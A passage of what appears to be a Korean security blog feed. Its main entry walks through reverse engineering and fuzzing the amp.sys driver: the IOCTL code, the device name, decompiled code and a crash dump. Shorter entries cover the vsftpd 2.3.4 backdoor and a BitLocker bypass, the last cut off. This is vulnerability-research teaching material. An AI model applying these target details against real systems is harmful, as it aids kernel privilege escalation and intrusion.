&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xACE0; <code>DeviceIoControl</code>&#xC744; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB418;&#xB294; IOCTL&#xC5D0; &#xB530;&#xB77C; &#xAC01;&#xAC01;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;. &#xC778;&#xB371;&#xC2A4; <code>IRP_MJ_DEVICE_CONTROL</code>&#xC758; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC740; &#xCF54;&#xB4DC;&#xC758; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC2A4;&#xC704;&#xCE58; &#xCF00;&#xC774;&#xC2A4;&#xCC98;&#xB7FC; &#xC791;&#xB3D9;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(IOCTL){    <span class="hljs-keyword">case</span> <span class="hljs-number">0xDEADBEEF</span>:        DoThis();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xC0FFEE</span>;        DoThat();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0x600DBABE</span>;    DoElse();    <span class="hljs-keyword">break</span>;}</code></pre><p>&#xC774;&#xB7EC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xD558;&#xB294; IOCTL &#xCF54;&#xB4DC;&#xC5D0; &#xB530;&#xB77C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC885;&#xB958;&#xC758; &#x201C;&#xCF54;&#xB4DC; &#xC9C0;&#xBB38;&#x201D;&#xC740; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1; &#xD558;&#xB294; &#xB3D9;&#xC548; &#xCC3E;&#xAE30;&#xAC00; &#xB9E4;&#xC6B0; &#xC27D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD558;&#xB2E4;. &#xC5B4;&#xB5A4; IOCTL&#xC774; &#xC5B4;&#xB5A4; &#xCF54;&#xB4DC;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xBA74; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB354; &#xC27D;&#xAC8C; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xD37C;&#xC9D5;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="Reverse-Engineering-Finding-the-IOCTL"><a href="#Reverse-Engineering-Finding-the-IOCTL" class="headerlink" title="Reverse Engineering: Finding the IOCTL"></a>Reverse Engineering: Finding the IOCTL</h1><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD574;&#xC57C; &#xD560; &#xC77C;&#xC740; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; IOCTL &#xCF54;&#xB4DC;&#xC640; &#xC7A5;&#xCE58; &#xC774;&#xB984; (symlink)&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC6B0;&#xB9AC;&#xC758; &#xACBD;&#xC6B0; &#xB300;&#xC0C1; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; <code>iolo &#x2013; System Mechanic Pro v.15.5.0.61 (amp.sys)</code>&#xC774;&#xBA70; &#xC124;&#xCE58; &#xC2DC; <code>WinObj</code>&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC7A5;&#xCE58; &#xC774;&#xB984;&#xACFC; &#xAD8C;&#xD55C;&#xC744; &#xBCF5;&#xAD6C;&#xD588;&#xB2E4;.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%202.png" alt="exploiting-driver/Untitled%202.png"></p><p>&#xC774;&#xC81C; &#xC7A5;&#xCE58; &#xC774;&#xB984; <code>\Device\AMP</code>&#xC744; &#xC218;&#xC9D1;&#xD588;&#xC73C;&#xB2C8; &#xB4DC;&#xB77C;&#xC774;&#xBC84; <code>amp.sys</code>&#xB97C; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB7EC; (IDA &#xC0AC;&#xC6A9;)&#xC5D0; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xB204;&#xB77D;&#xB41C; &#xACBD;&#xC6B0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD544;&#xC694;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;.</p><ul><li><code>DRIVER_OBJECT</code></li><li><code>IRP</code></li><li><code>IO_STACK_LOCATION</code></li></ul><p><code>DriverEntry</code> &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC870;&#xAE08; &#xB354; &#xBCF5;&#xC7A1;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. <code>Imports</code> &#xC139;&#xC158;&#xC5D0;&#xC11C; <code>IoDeviceControl</code> API&#xB97C; xref&#xD558;&#xAE30;&#xB85C; &#xACB0;&#xC815;&#xD588;&#xC73C;&#xBA70; &#xADF8; &#xACB0;&#xACFC;&#xB294; <code>SUB_2CFE0</code>(<code>DriverCreateDevice</code>&#xB85C; &#xBCC0;&#xACBD;) &#xD558;&#xB098;&#xBFD0;&#xC774;&#xB2E4;. </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%203.png" alt="exploiting-driver/Untitled%203.png"></p><p><code>DeviceName</code>&#xC774; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654; &#xB418;&#xACE0; <code>DriverObject</code>&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC62C;&#xBC14;&#xB978; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD588;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xB2E4;.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%204.png" alt="exploiting-driver/Untitled%204.png"></p><p><code>MajorFunction[14] (offset 0x0e)</code>&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control">IRP_MJ_DEVICE_CONTROL</a> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xC758; IOCTL &#xC138;&#xD2B8;&#xAC00; &#xC788;&#xB294; &#xACBD;&#xC6B0; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch">DispatchDeviceControl</a> &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC9C0;&#xC6D0;&#xD574;&#xC57C; &#xD558;&#xB294; &#xC694;&#xCCAD;&#xC774;&#xB2E4;. <code>SUB_2C580</code>&#xC744; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xBA74; &#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; IOCTL &#xCF54;&#xB4DC;&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xACE0; &#xC9C1;&#xC811; IOCTL &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_2C580</span><span class="hljs-params">(__int64 a1, IRP *a2)</span></span><span class="hljs-function"></span>{  BOOLEAN v3; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  ULONG v4; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _IO_STACK_LOCATION *v5; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  PNAMED_PIPE_CREATE_PARAMETERS v7; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  a2-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  v5 = a2-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( v5-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">2252803</span> )  {    v4 = v5-&gt;Parameters.Create.Options;    v7 = v5-&gt;Parameters.CreatePipe.Parameters;    v3 = IoIs32bitProcess(a2);    v6 = sub_166D0(v3, v7, v4);  }  <span class="hljs-keyword">else</span>  {    v6 = <span class="hljs-number">-1073741808</span>;  }  a2-&gt;IoStatus.Status = v6;  IofCompleteRequest(a2, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> v6;}</code></pre><p>&#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xAC70;&#xB098; &#xBD84;&#xC11D;&#xC774; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC6D0;&#xD55C;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Driver_IRP_MJ_DEVICE_CONTROL</span><span class="hljs-params">(DEVICE_OBJECT *DeviceObject, IRP *Irp)</span></span><span class="hljs-function"></span>{  __int64 result; <span class="hljs-comment">// rax</span>  _BYTE Is32BitProcess; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  _DWORD bufferSize; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _QWORD IoStackLocation; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  NTSTATUS status; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  _QWORD userBuffer; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  _QWORD; <span class="hljs-comment">// [rsp+68h] [rbp+10h]</span>  Irp-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  IoStackLocation = Irp-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( IoStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">0x226003</span> )<span class="hljs-comment">// IOCTL Code</span>  {    bufferSize = IoStackLocation-&gt;Parameters.Create.Options;    userBuffer = &amp;IoStackLocation-&gt;Parameters.CreatePipe.Parameters-&gt;NamedPipeType;    Is32BitProcess = IoIs32bitProcess(Irp);    status = DriverVulnerableFunction(Is32BitProcess, userBuffer, bufferSize);  }  <span class="hljs-keyword">else</span>  {    status = <span class="hljs-number">0xC0000010</span>;                        <span class="hljs-comment">// STATUS_INVALID_DEVICE_REQUEST</span>  }  Irp-&gt;IoStatus.Status = status;  IofCompleteRequest(Irp, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)status;}</code></pre><p>IOCTL &#xCF54;&#xB4DC; <code>0x226003</code>&#xB294; IOCTL &#xC694;&#xCCAD;&#xACFC; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130; &#xBC84;&#xD37C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD560; &#xB54C; &#xCEE4;&#xB110;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCD94;&#xAC00;&#xB85C; &#xB514;&#xCF54;&#xB529;&#xB420; &#xC218; &#xC788;&#xB2E4;. <a href="https://www.osronline.com/article.cfm%5Earticle=229.htm">OSR &#xC628;&#xB77C;&#xC778; IOCTL &#xB514;&#xCF54;&#xB354;</a> &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB2E4;&#xC74C; &#xC815;&#xBCF4;&#xB97C; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%205.png" alt="exploiting-driver/Untitled%205.png"></p><p><code>METHOD_NEITHER</code>&#xB294; IOCTL &#xC694;&#xCCAD;&#xACFC; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130; &#xBC84;&#xD37C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC00;&#xC7A5; &#xCDE8;&#xC57D;&#xD55C; &#xBC29;&#xC2DD;&#xC774;&#xB2E4;. &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; I/O &#xAD00;&#xB9AC;&#xC790;&#xB294; &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xC5B4;&#xB5A4; &#xC885;&#xB958;&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB3C4; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xD55C;&#xB2E4;. &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; &#xC788;&#xB294; &#xBC84;&#xADF8; &#xB610;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xD655;&#xB960;&#xC774; &#xB354; &#xB192;&#xB2E4;. &#xC774;&#xC81C; IOCTL &#xCF54;&#xB4DC; <code>0x226003</code>&#xC640; &#xC7A5;&#xCE58; &#xC774;&#xB984; <code>\Device\AMP</code>&#xC744; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD37C;&#xC9D5;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><p>IOCTL &#xCF54;&#xB4DC;&#xB97C; &#xAC80;&#xC0C9;&#xD55C; &#xD6C4; <a href="https://github.com/koutto/ioctlbf">ioctlbf</a>&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD37C;&#xC9D5;&#xD588;&#xB2E4;. Ioctlbf &#xAD6C;&#xBB38;&#xC740; &#xC774;&#xD574;&#xD558;&#xAE30; &#xB9E4;&#xC6B0; &#xC27D;&#xB2E4;. &#xBA3C;&#xC800; &#xC7A5;&#xCE58; &#xC774;&#xB984; <code>-d</code> &#xB97C; &#xC9C0;&#xC815;&#xD55C; &#xB2E4;&#xC74C; &#xD37C;&#xC9D5;&#xD560; IOCTL &#xCF54;&#xB4DC;&#xB97C; <code>-i</code>&#xB85C; &#xC9C0;&#xC815;&#xD55C; &#xB4A4; <code>-u</code> &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC81C;&#xACF5;&#xB41C; IOCTL &#xCF54;&#xB4DC;&#xB9CC; &#xD37C;&#xC9D5;&#xD558;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;. (&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; IOCTL &#xCF54;&#xB4DC;&#xAC00; &#xD558;&#xB098;&#xB9CC; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC774;&#xBBF8; &#xC54C;&#xACE0; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xBB34;&#xCC28;&#xBCC4; &#xB300;&#xC785;&#xC774; &#xD544;&#xC694; &#xC5C6;&#xB2E4;.)</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%206.png" alt="exploiting-driver/Untitled%206.png"></p><p>ioctlbf&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xC9C1;&#xD6C4; &#xB2E4;&#xC74C; &#xBA54;&#xC2DC;&#xC9C0; <code>amp+6c8d</code>&#xC640; &#xD568;&#xAED8; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">Access</span> violation - code c<span class="hljs-number">0000005</span> (!!! second chance !!!)<span class="hljs-attribute">fffff801</span>`<span class="hljs-number">3</span>ae<span class="hljs-number">96</span>c<span class="hljs-number">8</span>d <span class="hljs-number">488</span>b<span class="hljs-number">0</span>e          mov     rcx,qword ptr<span class="hljs-meta"> [rsi]</span><span class="hljs-attribute">PROCESS_NAME</span>:  ioctlbf.EXE<span class="hljs-attribute">READ_ADDRESS</span>:  <span class="hljs-number">0000000000000000</span> <span class="hljs-attribute">ERROR_CODE</span>: (NTSTATUS) <span class="hljs-number">0</span>xc<span class="hljs-number">0000005</span> - The instruction at <span class="hljs-number">0</span>x%p referenced memory at <span class="hljs-number">0</span>x%p. The memory could not be %s.<span class="hljs-attribute">EXCEPTION_CODE_STR</span>:  c<span class="hljs-number">0000005</span><span class="hljs-attribute">EXCEPTION_PARAMETER1</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">EXCEPTION_PARAMETER2</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">STACK_TEXT</span>:  <span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">0</span> ffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> : amp+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">8</span>d<span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">8</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : <span class="hljs-number">0</span>xffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span><span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>f<span class="hljs-number">0</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffe<span class="hljs-number">60</span>b`e<span class="hljs-number">5303</span>c<span class="hljs-number">80</span> : <span class="hljs-number">0</span>x<span class="hljs-number">1</span></code></pre><p>&#xB110; &#xD3EC;&#xC778;&#xD130; &#xC5ED; &#xCC38;&#xC870;&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xC624;&#xB958;&#xC774;&#xB2E4;. &#xC774;&#xC81C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xD574; access violation&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC774;&#xC720;&#xC640; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xC774;&#xD574;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xB2E4;.</p><hr><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC758; root cause &#xBD84;&#xC11D;&#xACFC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xB300;&#xD55C; &#xBC88;&#xC5ED;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>ioctl</tag>
      
      <tag>driver</tag>
      
      <tag>L0ch</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2011-2523: 현재진행형인 10년 전 vsftpd 백도어 취약점</title>
    <link href="/2021/04/20/l0ch/2021-04-20/"/>
    <url>/2021/04/20/l0ch/2021-04-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nitter.42l.fr/80vul/status/1382548572604813314">Just search for &#x201C;vsftpd version number&#x201D; directly in ZoomEye</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vsftpd 2.3.4</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2011-2523&#xC740; 10&#xB144; &#xC804; vsftpd 2.3.4&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC6D0;&#xC778;&#xBD88;&#xBA85;&#xC758; &#xBC31;&#xB3C4;&#xC5B4;&#xB294; &#xD3EC;&#xD2B8; 6200&#xC5D0;&#xC11C; listening shell&#xC744; &#xC5F4;&#xACE0;, &#xD574;&#xCEE4;&#xB294; &#xACF5;&#xAC1C;&#xB41C; &#xAC04;&#xB2E8;&#xD55C; <a href="https://www.exploit-db.com/exploits/49757?utm_source=dlvr.it&amp;utm_medium=twitter">exploit</a>&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB97C; &#xB9E4;&#xC6B0; &#xC27D;&#xAC8C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xB192;&#xC740; &#xC2EC;&#xAC01;&#xB3C4;&#xB85C; &#xBD84;&#xB958;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2011&#xB144; 7&#xC6D4; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC11C;&#xBE44;&#xC2A4; &#xAD6C;&#xC131; &#xC694;&#xC18C; &#xAC80;&#xC0C9; &#xC5D4;&#xC9C4;&#xC778; ZoomEye&#xC758; vsftpd &#xBC84;&#xC804; &#xAC80;&#xC0C9; &#xACB0;&#xACFC;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC57D; 10&#xB144;&#xC774; &#xC9C0;&#xB09C; &#xC9C0;&#xAE08; &#xC804; &#xC138;&#xACC4;&#xC758; &#xB9CE;&#xC740; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC5EC;&#xC804;&#xD788; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; vsftpd 2.3.4 &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC774; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/20/l0ch/2021-04-20/zoomeye.png" alt="zoomeye"></p><p>&#xC774;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548;&#xC5C5;&#xACC4;&#xC758; &#xB300;&#xCC98;&#xAC00; &#xD328;&#xCE58; &#xB9B4;&#xB9AC;&#xC988;&#xBFD0;&#xB9CC;&#xC774; &#xC544;&#xB2CC; &#xB2E4;&#xAC01;&#xB3C4;&#xC758; &#xC0AC;&#xD6C4;&#xAD00;&#xB9AC; &#xB610;&#xD55C; &#xD544;&#xC694;&#xD568;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&lt;/br&gt;</p><blockquote><p>&#xC0C1;&#xC6A9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xBC1C;&#xC0DD;&#xD55C; &#xBD84;&#xC7C1;&#xC5D0; &#xB300;&#xD574; hackyboiz&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xCC45;&#xC784;&#xB3C4; &#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>L0ch</tag>
      
      <tag>vsftpd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28316: Windows workstation FDE bypass and EOP</title>
    <link href="/2021/04/19/idioth/2021-04-19/"/>
    <url>/2021/04/19/idioth/2021-04-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://shenaniganslabs.io/2021/04/13/Airstrike.html">Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE-2021-28316)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xB3C4;&#xBA54;&#xC778;&#xC5D0; &#xAC00;&#xC785;&#xB41C; Windows 10 host</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC640;&#xC774;&#xD30C;&#xC774; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; Windows &#xB178;&#xD2B8;&#xBD81;&#xC774;&#xB098; &#xC6CC;&#xD06C;&#xC2A4;&#xD14C;&#xC774;&#xC158;&#xC5D0; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD560; &#xC2DC; &#xC7A0;&#xAE08; &#xD654;&#xBA74; &#xBC0F; BitLocker Full Disk Encryption&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294; 